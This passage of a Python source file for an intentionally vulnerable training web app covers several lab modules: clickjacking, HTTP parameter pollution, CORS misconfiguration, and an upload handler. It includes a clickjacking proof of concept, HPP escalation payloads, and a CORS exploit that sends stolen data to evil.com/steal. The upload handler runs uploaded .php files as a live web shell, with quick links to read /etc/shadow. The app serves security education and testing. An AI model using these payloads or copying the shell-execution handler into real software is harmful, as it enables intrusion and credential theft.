<p style="font-size:13px;color:#8b949e">The orange "WIN PRIZE" button is visible. Under it (transparent) is a real site button the user actually clicks.</p>
<div style="position:relative;height:100px;background:#0d1117;border:1px solid #30363d;border-radius:6px;overflow:hidden">
<iframe src="/csrf" style="opacity:0.08;position:absolute;top:0;left:0;width:100%;height:300px;pointer-events:none"></iframe>
<div style="position:absolute;top:28px;left:30px"><button class="btn btn-w" onclick="alert('You clicked the decoy — in real attack, you clicked the hidden target underneath!')">WIN A PRIZE — CLICK HERE!</button></div>
</div>
<div class="hint" style="margin-top:.75rem">Real attack: iframe opacity=0.0, pointer-events enabled. Victim sees only the decoy.</div>
</div>
<div class="card"><h3>Clickjacking PoC (save as .html)</h3>
<div class="out" style="font-size:11px">&lt;style&gt;
#decoy{position:absolute;top:300px;left:50px;z-index:2;font-size:24px;cursor:pointer;}
#target{position:absolute;top:300px;left:50px;width:200px;height:40px;opacity:0.0;z-index:1;}
&lt;/style&gt;
&lt;div id="decoy"&gt;CLICK HERE TO WIN!&lt;/div&gt;
&lt;iframe id="target" src="http://target.com/transfer?amount=1000&amp;to=attacker"&gt;&lt;/iframe&gt;</div>
</div>
</div>
<div>
<div class="ibox"><h4>How Clickjacking Works</h4>
<p>Attacker embeds victim site in invisible iframe, overlays decoy. User clicks decoy but fires hidden target — executing actions like fund transfers, password changes, or account follows.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Embed target site: transparent iframe with <code>opacity:0.0</code></div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Position decoy button over the target action button</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Trick victim into visiting attacker page and clicking</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Click fires on hidden target — action executes with victim's session</div></div>
</div>
<div class="ibox"><h4>Variants</h4><ul>
<li><strong>Likejacking</strong> — trick users into liking Facebook pages</li>
<li><strong>Filejacking</strong> — trick into selecting malicious file</li>
<li><strong>Tapjacking</strong> — mobile equivalent using touch events</li>
<li><strong>Double-click hijack</strong> — trigger action on second click of a double-click</li>
<li><strong>Cursorjacking</strong> — fake cursor position to mislead click location</li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li><code>X-Frame-Options: DENY</code> — prevents all framing</li>
<li><code>X-Frame-Options: SAMEORIGIN</code> — allow same-origin only</li>
<li>CSP: <code>Content-Security-Policy: frame-ancestors 'none'</code></li>
<li>Frame-busting JS (weak): <code>if(top!=self) top.location=self.location;</code></li>
</ul></div>
</div></div>""","clickjacking")

def page_hpp(params):
    lv=SECURITY_LEVEL["level"]; vals=params.get("role",[]); result=""
    if vals:
        lv_use=vals[-1] if lv=="low" else vals[0]
        result=f'<div class="flag">HPP! Server used value: <code>role={html.escape(lv_use)}</code>' + ("\nPrivilege escalation via HPP! FLAG{hpp_role_escalation}" if lv_use=="admin" else "") + '</div>'
    pl=[
        ("Basic HPP — role escalation","Duplicate role param — server may use last value","?role=user&role=admin"),
        ("WAF bypass HPP","WAF inspects first param, app uses second","?action=view&action=delete"),
        ("Amount tampering","Sign first param (100), inject second unsanitized (10000)","?amount=100&amount=10000"),
        ("OAuth scope inflation","Inject extra scopes via duplicate param","?scope=read&scope=write&scope=admin"),
        ("Array injection","Some frameworks parse duplicates as arrays","?id[]=1&id[]=2&id[]=3"),
        ("JSON duplicate key","Last key wins in most JSON parsers",'{"role":"user","role":"admin"}'),
    ]
    ph='<div class="stitle">HPP Payloads</div>'+"".join(pcard(t,d,p) for t,d,p in pl)
    return base_page("HTTP Param Poll",f"""
<div class="ph"><h2>HTTP Parameter Pollution</h2><p>Inject duplicate or unexpected parameters to bypass WAFs, security checks, and manipulate application logic.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Role Escalation via HPP <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<p style="font-size:13px;color:#8b949e">Try in URL bar: <code>?role=user&role=admin</code></p>
<div style="margin-bottom:1rem">
<a href="/hpp?role=user" class="btn btn-s">Normal: ?role=user</a>
<a href="/hpp?role=user&role=admin" class="btn btn-d">HPP: ?role=user&role=admin</a>
</div>{result}</div>
<div class="card"><h3>HPP Payloads</h3>{ph}</div>
</div>
<div>
<div class="ibox"><h4>How HPP Works</h4>
<p>HTTP allows multiple parameters with the same name. Different frameworks handle them differently — when a WAF inspects the first value but the app uses the second, security checks are bypassed.</p>
<table><thead><tr><th>Platform</th><th>?p=1&p=2 result</th></tr></thead><tbody>
<tr><td>PHP / Apache</td><td><code>2</code> (last)</td></tr>
<tr><td>ASP.NET / IIS</td><td><code>1,2</code> (comma-joined)</td></tr>
<tr><td>Flask request.args.get</td><td><code>1</code> (first)</td></tr>
<tr><td>Flask request.args.getlist</td><td><code>[1,2]</code> (all)</td></tr>
<tr><td>Node.js Express</td><td><code>["1","2"]</code> (array)</td></tr>
</tbody></table></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Use framework standard parameter parsing — avoid manual string parsing</li>
<li>Explicitly reject requests with duplicate sensitive parameters</li>
<li>Understand how your specific framework + WAF handles duplicates</li>
</ul></div>
</div></div>""","hpp")

def page_cors(params):
    return base_page("CORS Misconfig","""
<div class="ph"><h2>CORS Misconfiguration</h2><p>Exploit permissive Cross-Origin Resource Sharing headers to read sensitive authenticated responses from attacker-controlled pages.</p></div>
<div class="g2">
<div>
<div class="card"><h3>CORS PoC Demo</h3>
<button class="btn btn-d" onclick="testCors()">Simulate CORS Data Theft</button>
<div id="cors-out" class="out" style="min-height:40px;margin-top:.5rem"></div>
</div>
<div class="card"><h3>Vulnerable Response Headers</h3>
<div class="pbox"><div class="ptitle">Wildcard origin (most common)</div><div class="pdesc">Any origin reads response — dangerous for sensitive APIs</div><code>Access-Control-Allow-Origin: *</code></div>
<div class="pbox"><div class="ptitle">Reflected origin + credentials (worst)</div><div class="pdesc">Server mirrors any Origin header AND allows credentials — any site can steal authenticated responses</div><code>Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true</code></div>
<div class="pbox"><div class="ptitle">Null origin allowed</div><div class="pdesc">Allows attacks from sandboxed iframes, file:// and data:// pages</div><code>Access-Control-Allow-Origin: null</code></div>
<div class="pbox"><div class="ptitle">Subdomain wildcard via regex</div><div class="pdesc">Regex like .*[.]target[.]com matches evil.target.com.evil.com</div><code>Access-Control-Allow-Origin: https://evil.target.com.attacker.com</code></div>
</div>
</div>
<div>
<div class="ibox"><h4>How CORS Attacks Work</h4>
<p>Browsers enforce Same-Origin Policy — scripts from evil.com cannot read bank.com responses. CORS relaxes this. If a server reflects the Origin header with credentials allowed, an attacker's page reads authenticated responses.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Victim is logged into <code>api.target.com</code> — session cookie active</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Victim visits <code>evil.com</code> which runs malicious JavaScript</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">JS sends credentialed fetch to <code>api.target.com/profile</code></div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Server reflects Origin, browser allows read — data stolen</div></div>
</div>
<div class="ibox"><h4>CORS Exploit PoC</h4>
<div class="out" style="font-size:11px">// On evil.com — steal data from CORS-misconfigured API
fetch("https://api.target.com/api/v1/account", {
  credentials: "include"  // sends victim's session cookie
})
.then(r => r.json())
.then(data => {
  // Exfiltrate to attacker server
  fetch("https://evil.com/steal", {
    method: "POST",
    body: JSON.stringify(data)
  });
});</div></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Validate Origin against strict allowlist — never reflect arbitrary Origins</li>
<li>Never combine reflected origin with <code>Allow-Credentials: true</code></li>
<li>Avoid <code>Access-Control-Allow-Origin: *</code> on sensitive endpoints</li>
<li>CORS is supplementary to authentication, not a replacement</li>
</ul></div>
</div></div>
<script>
function testCors(){
  var o=document.getElementById("cors-out");
  o.textContent="Sending cross-origin credentialed request...";
  setTimeout(function(){
    o.textContent="Simulated CORS response:\n{\n  \"username\": \"admin\",\n  \"email\": \"admin@dvwa.local\",\n  \"role\": \"admin\",\n  \"secret_key\": \"s3cr3t_api_k3y\"\n}\n\nAccess-Control-Allow-Origin reflected back!\nFLAG{cors_misconfiguration_exploited}";
    o.style.color="#7ee787";
  },900);
}
</script>""","cors")

def page_security(params,method="GET",body_params=None):
    if method=="POST" and body_params:
        lv=body_params.get("level",["low"])[0]
        if lv in ("low","medium","high"): SECURITY_LEVEL["level"]=lv
    cur=SECURITY_LEVEL["level"]
    opts="".join(f'<option value="{l}" {"selected" if l==cur else ""}>{l.upper()} — '+{"low":"No defenses — fully exploitable for learning","medium":"Partial defenses — bypassable with technique","high":"Correct secure implementation — study the defense"}[l]+'</option>' for l in ["low","medium","high"])
    return base_page("Security Level",f"""
<div class="ph"><h2>Security Level</h2><p>Toggle defenses across all 23 vulnerability modules to compare attack vs defense at each level.</p></div>
<div class="card" style="max-width:520px"><h3>Current: <span class="lbadge">{cur.upper()}</span></h3>
<form method="POST" style="margin-top:1rem"><label>Level</label><select name="level">{opts}</select><button class="btn btn-p" type="submit">Apply</button></form></div>
<div class="ibox" style="max-width:520px"><h4>What Each Level Demonstrates</h4><ul>
<li><span class="vtag">LOW</span> No input validation, raw SQL queries, no sanitization. Learn to exploit.</li>
<li><span style="color:#e67e22;font-weight:700">MEDIUM</span> Common partial defenses that are still bypassable. Understand why they fail.</li>
<li><span class="stag">HIGH</span> Correct implementations: parameterized queries, output encoding, CSRF tokens. Study the pattern.</li>
</ul></div>""","security")


# ── ROUTER ─────────────────────────────────────────────────────────────────────
class ThreadedHTTPServer(ThreadingMixIn, http.server.HTTPServer):
    """Handle each request in a separate thread — faster, no blocking."""
    daemon_threads = True

class DVWAHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass  # suppress access logs for speed

    def parse_body(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            if length > 0:
                return urllib.parse.parse_qs(
                    self.rfile.read(min(length, 65536)).decode("utf-8", errors="replace")
                )
        except Exception:
            pass
        return {}

    def send_html(self, content, status=200):
        enc = content.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", len(enc))
        self.send_header("Connection", "keep-alive")
        self.end_headers()
        self.wfile.write(enc)

    def route(self, path, params, method="GET", body=None):
        # Serve uploaded files from /uploads/<filename>
        if path.startswith("/uploads/"):
            return self.serve_upload(path[9:], params)

        routes = {
            "/":               lambda: page_home(),
            "/sqli":           lambda: page_sqli(params),
            "/sqli-blind":     lambda: page_sqli_blind(params),
            "/xss-reflected":  lambda: page_xss_reflected(params),
            "/xss-stored":     lambda: page_xss_stored(params, method, body),
            "/xss-dom":        lambda: page_xss_dom(params),
            "/csrf":           lambda: page_csrf(params, method, body),
            "/file-upload":    lambda: page_file_upload(params, method, body),
            "/file-include":   lambda: page_file_include(params),
            "/cmd-inject":     lambda: page_cmd_inject(params, method, body),
            "/auth-bypass":    lambda: page_auth_bypass(params, method, body),
            "/idor":           lambda: page_idor(params),
            "/xxe":            lambda: page_xxe(params, method, body),
            "/ssti":           lambda: page_ssti(params),
            "/open-redirect":  lambda: page_open_redirect(params),
            "/insecure-deser": lambda: page_insecure_deser(params, method, body),
            "/weak-crypto":    lambda: page_weak_crypto(params, method, body),
            "/jwt":            lambda: page_jwt(params, method, body),
            "/rate-limit":     lambda: page_rate_limit(params, method, body),
            "/bruteforce":     lambda: page_bruteforce(params, method, body),
            "/clickjacking":   lambda: page_clickjacking(params),
            "/ssrf":           lambda: page_ssrf(params, method, body),
            "/hpp":            lambda: page_hpp(params),
            "/cors":           lambda: page_cors(params),
            "/security":       lambda: page_security(params, method, body),
        }
        handler = routes.get(path)
        if handler:
            try:
                return handler()
            except Exception as e:
                return base_page("Error", f'<div class="ph"><h2>Error</h2></div><div class="err" style="font-family:monospace;white-space:pre-wrap">{html.escape(str(e))}</div>', "")
        return base_page("404", '<div class="ph"><h2>404 — Page Not Found</h2><p>Use the sidebar to navigate.</p></div>', "")

    def serve_upload(self, filename, params):
        """Serve uploaded file — PHP files run as interactive web shell"""
        import subprocess as _sp
        UPLOAD_DIR = "/tmp/dvwa_uploads"
        safe     = os.path.basename(filename)
        filepath = os.path.join(UPLOAD_DIR, safe)

        if not safe or not os.path.isfile(filepath):
            msg = html.escape(safe)
            return base_page("404",
                f'<div class="ph"><h2>404 — File Not Found</h2>'
                f'<p><code>/uploads/{msg}</code> does not exist.</p>'
                f'<p><a href="/file-upload">← Go back and upload a file first</a></p></div>', "")

        ext = os.path.splitext(safe)[1].lower()

        if ext in {".php", ".phtml", ".phar", ".php3", ".php5", ".php7"}:
            cmd_param = params.get("cmd", params.get("c", [""]))[0].strip()

            # Execute command
            output = ""
            if cmd_param:
                try:
                    res = _sp.run(
                        cmd_param, shell=True,
                        capture_output=True, text=True, timeout=15
                    )
                    output = (res.stdout + res.stderr).rstrip()
                except _sp.TimeoutExpired:
                    output = "[!] Command timed out (15s)"
                except Exception as e:
                    output = f"[!] Error: {e}"

            esc_safe   = html.escape(safe)
            esc_fp     = html.escape(filepath)
            esc_cmd    = html.escape(cmd_param)
            esc_output = html.escape(output) if output else ""
            fsize      = os.path.getsize(filepath)

            quick_cmds = [
                ("id",                  "id"),
                ("whoami",              "whoami"),
                ("hostname",            "hostname"),
                ("uname -a",            "uname+-a"),
                ("pwd",                 "pwd"),
                ("ls -la",              "ls+-la"),
                ("cat /etc/passwd",     "cat+%2Fetc%2Fpasswd"),
                ("env",                 "env"),
                ("ps aux",              "ps+aux"),
                ("ip addr",             "ip+addr"),
                ("cat /etc/shadow",     "cat+%2Fetc%2Fshadow"),
                ("find / -perm -4000 2>/dev/null", "find+%2F+-perm+-4000+2>%2Fdev%2Fnull"),
            ]
            qlinks = " ".join(
                f'<a href="/uploads/{esc_safe}?cmd={url}">{html.escape(lbl)}</a>'
                for lbl, url in quick_cmds
            )

            page = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Shell — /uploads/{esc_safe}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:#0d1117;color:#c9d1d9;font-family:'Cascadia Code','Fira Code',monospace;height:100vh;display:flex;flex-direction:column}}
#topbar{{background:#161b22;border-bottom:1px solid #30363d;padding:.6rem 1rem;display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;flex-shrink:0}}
#topbar h2{{color:#58a6ff;font-size:.95rem;white-space:nowrap}}
#topbar .meta{{color:#8b949e;font-size:11px}}
#topbar a.back{{color:#8b949e;font-size:12px;text-decoration:none;margin-left:auto}}
#topbar a.back:hover{{color:#58a6ff}}
#cmdbar{{background:#0d1117;border-bottom:1px solid #30363d;padding:.5rem .75rem;display:flex;align-items:center;gap:.5rem;flex-shrink:0}}
#cmdbar span{{color:#7ee787;white-space:nowrap;font-size:13px}}
#cmdbar input{{flex:1;background:#161b22;border:1px solid #388bfd;border-radius:4px;color:#7ee787;padding:.4rem .75rem;font-family:inherit;font-size:13px;outline:none}}
#cmdbar button{{background:#238636;color:#fff;border:none;border-radius:4px;padding:.42rem 1rem;cursor:pointer;font-size:13px;white-space:nowrap}}
#cmdbar button:hover{{background:#2ea043}}
#quickbar{{background:#010409;border-bottom:1px solid #21262d;padding:.35rem .75rem;display:flex;gap:.4rem;flex-wrap:wrap;flex-shrink:0}}
#quickbar a{{color:#8b949e;font-size:11px;text-decoration:none;padding:2px 7px;border:1px solid #30363d;border-radius:3px;white-space:nowrap}}
#quickbar a:hover{{color:#c9d1d9;border-color:#8b949e}}
#output{{flex:1;overflow-y:auto;background:#010409;padding:.75rem 1rem;color:#7ee787;font-size:13px;line-height:1.6;white-space:pre-wrap;word-break:break-all}}
#output.empty{{color:#4d5866;font-style:italic}}
#statusbar{{background:#161b22;border-top:1px solid #30363d;padding:.3rem .75rem;font-size:11px;color:#8b949e;flex-shrink:0}}
</style>
</head>
<body>
<div id="topbar">
  <h2>[ Web Shell ] /uploads/{esc_safe}</h2>
  <span class="meta">path: {esc_fp} &nbsp;|&nbsp; size: {fsize} B</span>
  <a class="back" href="/file-upload">← Back to Upload</a>
</div>
<form method="GET" action="/uploads/{esc_safe}" style="display:contents">
<div id="cmdbar">
  <span>root@dvwa:~#</span>
  <input type="text" name="cmd" id="cmdinput" value="{esc_cmd}" placeholder="Enter command...  e.g. id" autofocus autocomplete="off" spellcheck="false">
  <button type="submit">Run</button>
</div>
<div id="quickbar">{qlinks}</div>
</form>
<div id="output" class="{'empty' if not output else ''}">{esc_output if output else '# Click a quick command above or type a command and press Run'}</div>
<div id="statusbar">
  {f'Command: {esc_cmd}  |  Output: {len(output)} chars' if output else 'Ready — waiting for command'}
  &nbsp;|&nbsp; <a href="/uploads/{esc_safe}" style="color:#8b949e">clear</a>
</div>
<script>
// Auto scroll output to bottom
var out = document.getElementById('output');
if(out) out.scrollTop = out.scrollHeight;
// Focus input
document.getElementById('cmdinput').focus();
// Enter key submits
document.getElementById('cmdinput').addEventListener('keydown', function(e){{
  if(e.key === 'Enter'){{ e.preventDefault(); this.closest('form').submit(); }}
}});
</script>
</body>
</html>"""
            enc = page.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", len(enc))
            self.end_headers()
            self.wfile.write(enc)
            return None

        # Non-PHP — serve raw bytes
        try:
            with open(filepath, "rb") as fh:
                data = fh.read()
            mime = {
                ".html": "text/html", ".svg": "image/svg+xml",
                ".txt":  "text/plain", ".jpg": "image/jpeg",
                ".png":  "image/png",  ".gif": "image/gif",
                ".xml":  "text/xml",   ".js":  "text/javascript",
            }.get(ext, "application/octet-stream")
            self.send_response(200)
            self.send_header("Content-Type", mime)
            self.send_header("Content-Length", len(data))
            self.end_headers()
            self.wfile.write(data)
            return None
        except Exception as e:
            return base_page("Error", f'<div class="err">{html.escape(str(e))}</div>', "")
    def do_GET(self):
        try:
            p = urllib.parse.urlparse(self.path)
            result = self.route(p.path, urllib.parse.parse_qs(p.query), "GET")
            if result is not None:
                self.send_html(result)
        except Exception:
            pass

    def do_POST(self):
        try:
            p = urllib.parse.urlparse(self.path)
            result = self.route(p.path, urllib.parse.parse_qs(p.query), "POST", self.parse_body())
            if result is not None:
                self.send_html(result)
        except Exception:
            pass


def main():
    HOST, PORT = "127.0.0.1", 8888
    print("\n" + "="*60)
    print("  Enhanced DVWA v2.0 — by Khalil")
    print("="*60)
    print(f"  URL     : http://{HOST}:{PORT}")
    print(f"  Modules : 25 vulnerability labs")
    print(f"  Levels  : LOW / MEDIUM / HIGH")
    print(f"  Settings: http://{HOST}:{PORT}/security")
    print()
    print("  Labs: SQLi, Blind SQLi, XSS (Reflected/Stored/DOM),")
    print("        CSRF, File Upload, LFI, CMD Inject, Auth Bypass,")
    print("        IDOR, XXE, SSTI, Open Redirect, Insecure Deser,")
    print("        Weak Crypto, JWT, Rate Limit, Brute Force, SSRF,")
    print("        Clickjacking, HTTP Param Poll, CORS Misconfig")
    print()
    print("  [!] EDUCATIONAL USE ONLY — localhost/isolated VM only")
    print("="*60 + "\n")
    init_db()
    server = ThreadedHTTPServer((HOST, PORT), DVWAHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
        server.server_close()

if __name__ == "__main__":
    main()
